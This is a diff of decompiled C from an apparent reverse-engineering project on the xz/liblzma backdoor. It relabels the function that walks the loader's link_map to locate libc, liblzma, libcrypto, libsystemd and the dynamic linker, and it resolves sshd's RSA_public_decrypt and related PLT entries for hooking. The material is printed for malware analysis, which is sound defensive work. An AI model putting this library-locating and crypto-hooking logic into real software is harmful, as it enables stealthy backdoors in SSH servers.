@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/104660_process_shared_libraries_map.c
 // Function: process_shared_libraries_map @ 0x104660
-// Calling convention: unknown
-// Prototype: undefined process_shared_libraries_map(void)
+// Calling convention: __stdcall
+// Prototype: BOOL __stdcall process_shared_libraries_map(link_map * r_map, backdoor_shared_libraries_data_t * data)
 
 
 /*
@@ -15,188 +15,200 @@
 #include "xzre_types.h"
 
 
-bool process_shared_libraries_map(ulong *param_1,long *param_2)
+BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data_t *data)
 
 {
   char cVar1;
-  long lVar2;
+  undefined8 *puVar2;
   undefined8 *puVar3;
   undefined8 *puVar4;
-  undefined8 *puVar5;
-  long *plVar6;
-  uint uVar7;
-  int iVar8;
-  long lVar9;
-  ulong *puVar10;
-  char *pcVar11;
-  char *pcVar12;
+  elf_info_t *peVar5;
+  link_map *plVar6;
+  backdoor_data_t *pbVar7;
+  backdoor_hooks_data_t **ppbVar8;
+  EncodedStringId EVar9;
+  BOOL BVar10;
+  Elf64_Sym *pEVar11;
+  uchar *puVar12;
+  ulong *puVar13;
+  void *pvVar14;
+  char *string_end;
+  char *string_begin;
   Elf64_Sym *rtld_global_sym;
+  EncodedStringId string_id;
+  backdoor_data_t *shared_data;
   char *basename;
-  ulong link_map_cursor;
+  link_map *link_map_cursor;
   
-  if (param_1 == (ulong *)0x0) {
+  if (r_map == (link_map *)0x0) {
     return FALSE;
   }
-  lVar9 = elf_symbol_get(*(undefined8 *)(param_2[1] + 8),0x5b8,0);
-  if (lVar9 == 0) {
+  pEVar11 = elf_symbol_get(data->elf_handles->dynamic_linker,STR_rtld_global,0);
+  if (pEVar11 == (Elf64_Sym *)0x0) {
     return FALSE;
   }
   do {
-    if (param_1[3] == 0) {
-      plVar6 = (long *)*param_2;
-      if (*plVar6 == 0) {
+    if (*(ulong *)(r_map + 0x18) == 0) {
+      pbVar7 = data->data;
+      if (pbVar7->main_map == (link_map *)0x0) {
         return FALSE;
       }
-      if (plVar6[3] == 0) {
+      if (pbVar7->libcrypto_map == (link_map *)0x0) {
         return FALSE;
       }
-      if (plVar6[1] == 0) {
+      if (pbVar7->dynamic_linker_map == (link_map *)0x0) {
         return FALSE;
       }
-      if (plVar6[4] == 0) {
+      if (pbVar7->libsystemd_map == (link_map *)0x0) {
         return FALSE;
       }
-      if (plVar6[2] == 0) {
+      if (pbVar7->liblzma_map == (link_map *)0x0) {
         return FALSE;
       }
-      if (plVar6[5] == 0) {
+      if (pbVar7->libc_map == (link_map *)0x0) {
         return FALSE;
       }
       break;
     }
-    if (*param_1 == 0) {
+    if (*(ulong *)r_map == 0) {
       return FALSE;
     }
-    pcVar11 = (char *)param_1[1];
-    if (pcVar11 == (char *)0x0) {
+    string_end = *(char **)(r_map + 8);
+    if (string_end == (char *)0x0) {
       return FALSE;
     }
-    if (param_1[2] == 0) {
+    if (*(ulong *)(r_map + 0x10) == 0) {
       return FALSE;
     }
-    pcVar12 = pcVar11;
-    if (*pcVar11 == '\0') {
-      if (*(long *)*param_2 != 0) {
+    string_begin = string_end;
+    if (*string_end == '\0') {
+      if (data->data->main_map != (link_map *)0x0) {
         return FALSE;
       }
-      *(long *)*param_2 = (long)param_1;
+      data->data->main_map = r_map;
     }
     else {
-      while (cVar1 = *pcVar11, cVar1 != '\0') {
-        pcVar11 = pcVar11 + 1;
+      while (cVar1 = *string_end, cVar1 != '\0') {
+        string_end = string_end + 1;
         if (cVar1 == '/') {
-          pcVar12 = pcVar11;
+          string_begin = string_end;
         }
       }
-      uVar7 = get_string_id(pcVar12);
-      lVar2 = *param_2;
-      if (uVar7 == 2000) {
-        if (*(long *)(lVar2 + 0x28) != 0) {
+      EVar9 = get_string_id(string_begin,string_end);
+      pbVar7 = data->data;
+      if (EVar9 == STR_libc_so) {
+        if (pbVar7->libc_map != (link_map *)0x0) {
           return FALSE;
         }
-        *(ulong **)(lVar2 + 0x28) = param_1;
+        pbVar7->libc_map = r_map;
       }
-      else if (uVar7 < 0x7d1) {
-        if (uVar7 == 0x590) {
-          if (*(long *)(lVar2 + 0x10) != 0) {
+      else if (EVar9 < 0x7d1) {
+        if (EVar9 == STR_liblzma_so) {
+          if (pbVar7->liblzma_map != (link_map *)0x0) {
             return FALSE;
           }
-          if (0x10465f < *param_1) {
+          if (0x10465f < *(ulong *)r_map) {
             return FALSE;
           }
-          if ((code *)(*param_1 + 0x400000) < process_shared_libraries_map) {
+          if ((code *)(*(ulong *)r_map + 0x400000) < process_shared_libraries_map) {
             return FALSE;
           }
-          if (param_1[3] == 0) {
+          if (*(ulong *)(r_map + 0x18) == 0) {
             return FALSE;
           }
-          *(ulong **)(lVar2 + 0x10) = param_1;
+          pbVar7->liblzma_map = r_map;
         }
-        else if (uVar7 == 0x7c0) {
-          if (*(long *)(lVar2 + 0x18) != 0) {
+        else if (EVar9 == STR_libcrypto_so) {
+          if (pbVar7->libcrypto_map != (link_map *)0x0) {
             return FALSE;
           }
-          *(ulong **)(lVar2 + 0x18) = param_1;
+          pbVar7->libcrypto_map = r_map;
         }
       }
-      else if (uVar7 == 0x938) {
-        if (*(long *)(lVar2 + 0x20) != 0) {
+      else if (EVar9 == STR_libsystemd_so) {
+        if (pbVar7->libsystemd_map != (link_map *)0x0) {
           return FALSE;
         }
-        *(ulong **)(lVar2 + 0x20) = param_1;
+        pbVar7->libsystemd_map = r_map;
       }
-      else if (uVar7 == 0xa48) {
-        if (*(long *)(lVar2 + 8) != 0) {
+      else if (EVar9 == STR_ld_linux_x86_64_so) {
+        if (pbVar7->dynamic_linker_map != (link_map *)0x0) {
           return FALSE;
         }
-        puVar10 = (ulong *)(*(long *)(lVar9 + 8) + **(long **)(param_2[1] + 8));
-        if (param_1 <= puVar10) {
+        peVar5 = data->elf_handles->dynamic_linker;
+        puVar12 = peVar5->elfbase->e_ident + pEVar11->st_value;
+        if (r_map <= puVar12) {
           return FALSE;
         }
-        if (*(ulong *)(lVar9 + 0x10) < (ulong)((long)param_1 - (long)puVar10)) {
+        if (pEVar11->st_size < (ulong)((long)r_map - (long)puVar12)) {
           return FALSE;
         }
-        if (param_1[2] != (*(long **)(param_2[1] + 8))[4]) {
+        if (*(Elf64_Dyn **)(r_map + 0x10) != peVar5->dyn) {
           return FALSE;
         }
-        *(ulong **)(lVar2 + 8) = param_1;
+        pbVar7->dynamic_linker_map = r_map;
       }
     }
-    plVar6 = (long *)*param_2;
-    param_1 = (ulong *)param_1[3];
-  } while ((((*plVar6 == 0) || (plVar6[3] == 0)) || (plVar6[1] == 0)) ||
-          (((plVar6[4] == 0 || (plVar6[2] == 0)) || (plVar6[5] == 0))));
-  puVar3 = (undefined8 *)param_2[4];
-  puVar4 = (undefined8 *)param_2[3];
-  puVar5 = (undefined8 *)param_2[2];
-  lVar9 = *(long *)param_2[1];
-  if (*(undefined8 **)*param_2 == (undefined8 *)0x0) {
+    pbVar7 = data->data;
+    r_map = *(link_map **)(r_map + 0x18);
+  } while ((((pbVar7->main_map == (link_map *)0x0) || (pbVar7->libcrypto_map == (link_map *)0x0)) ||
+           (pbVar7->dynamic_linker_map == (link_map *)0x0)) ||
+          (((pbVar7->libsystemd_map == (link_map *)0x0 || (pbVar7->liblzma_map == (link_map *)0x0))
+           || (pbVar7->libc_map == (link_map *)0x0))));
+  puVar2 = (undefined8 *)data->RSA_get0_key_plt;
+  puVar3 = (undefined8 *)data->EVP_PKEY_set1_RSA_plt;
+  puVar4 = (undefined8 *)data->RSA_public_decrypt_plt;
+  peVar5 = data->elf_handles->main;
+  plVar6 = data->data->main_map;
+  if (plVar6 == (link_map *)0x0) {
     return FALSE;
   }
-  iVar8 = elf_parse(**(undefined8 **)*param_2,lVar9);
-  if (iVar8 == 0) {
+  BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,peVar5);
+  if (BVar10 == FALSE) {
     return FALSE;
   }
-  if (*(int *)(lVar9 + 0x4c) == 0) {
+  if (peVar5->gnurelro_found == FALSE) {
     return FALSE;
   }
-  if ((*(byte *)(lVar9 + 0xd0) & 0x20) == 0) {
+  if ((peVar5->flags & 0x20) == 0) {
     return FALSE;
   }
-  puVar10 = (ulong *)elf_get_plt_symbol(lVar9,0x1d0);
-  *puVar5 = puVar10;
-  if (puVar10 < (ulong *)0x1000000) {
-    puVar10 = (ulong *)elf_get_plt_symbol(lVar9,0x510);
-    *puVar4 = puVar10;
-    if (((ulong *)0xffffff < puVar10) && (0xffffff < *puVar10)) {
+  puVar13 = (ulong *)elf_get_plt_symbol(peVar5,STR_RSA_public_decrypt);
+  *puVar4 = puVar13;
+  if (puVar13 < (ulong *)0x1000000) {
+    puVar13 = (ulong *)elf_get_plt_symbol(peVar5,STR_EVP_PKEY_set1_RSA);
+    *puVar3 = puVar13;
+    if (((ulong *)0xffffff < puVar13) && (0xffffff < *puVar13)) {
       return FALSE;
     }
-    puVar10 = (ulong *)elf_get_plt_symbol(lVar9,0x798);
-    *puVar3 = puVar10;
-    if (puVar10 < (ulong *)0x1000000) goto LAB_00104924;
+    puVar13 = (ulong *)elf_get_plt_symbol(peVar5,STR_RSA_get0_key);
+    *puVar2 = puVar13;
+    if (puVar13 < (ulong *)0x1000000) goto LAB_00104924;
   }
-  if (0xffffff < *puVar10) {
+  if (0xffffff < *puVar13) {
     return FALSE;
   }
 LAB_00104924:
-  if ((*(undefined8 **)(*param_2 + 0x18) != (undefined8 *)0x0) &&
-     (iVar8 = elf_parse(**(undefined8 **)(*param_2 + 0x18)), iVar8 != 0)) {
-    plVar6 = (long *)param_2[5];
-    link_map_cursor = 0;
-    lVar9 = *(long *)(param_2[1] + 0x18);
-    if ((*(undefined8 **)(*param_2 + 0x10) != (undefined8 *)0x0) &&
-       (((iVar8 = elf_parse(**(undefined8 **)(*param_2 + 0x10),lVar9), iVar8 != 0 &&
-         ((*(byte *)(lVar9 + 0xd0) & 0x20) != 0)) &&
-        (lVar9 = elf_get_data_segment(lVar9,&link_map_cursor,1), 0x597 < link_map_cursor)))) {
-      *plVar6 = lVar9 + 0x10;
-      *(ulong *)(lVar9 + 0x590) = link_map_cursor - 0x598;
-      if ((*(undefined8 **)(*param_2 + 0x28) != (undefined8 *)0x0) &&
-         (iVar8 = elf_parse(**(undefined8 **)(*param_2 + 0x28),*(undefined8 *)(param_2[1] + 0x10)),
-         iVar8 != 0)) {
-        iVar8 = resolve_libc_imports
-                          (*(undefined8 *)(*param_2 + 0x28),*(undefined8 *)(param_2[1] + 0x10),
-                           param_2[6]);
-        return iVar8 != 0;
+  plVar6 = data->data->libcrypto_map;
+  if ((plVar6 != (link_map *)0x0) &&
+     (BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,data->elf_handles->libcrypto), BVar10 != FALSE)) {
+    ppbVar8 = data->hooks_data_addr;
+    link_map_cursor = (link_map *)0x0;
+    peVar5 = data->elf_handles->liblzma;
+    plVar6 = data->data->liblzma_map;
+    if ((plVar6 != (link_map *)0x0) &&
+       (((BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,peVar5), BVar10 != FALSE &&
+         ((peVar5->flags & 0x20) != 0)) &&
+        (pvVar14 = elf_get_data_segment(peVar5,(u64 *)&link_map_cursor,TRUE),
+        (link_map *)0x597 < link_map_cursor)))) {
+      *ppbVar8 = (backdoor_hooks_data_t *)((long)pvVar14 + 0x10);
+      *(link_map **)((long)pvVar14 + 0x590) = link_map_cursor + -0x598;
+      plVar6 = data->data->libc_map;
+      if ((plVar6 != (link_map *)0x0) &&
+         (BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,data->elf_handles->libc), BVar10 != FALSE)) {
+        BVar10 = resolve_libc_imports
+                           (data->data->libc_map,data->elf_handles->libc,data->libc_imports);
+        return (uint)(BVar10 != FALSE);
       }
     }
   }
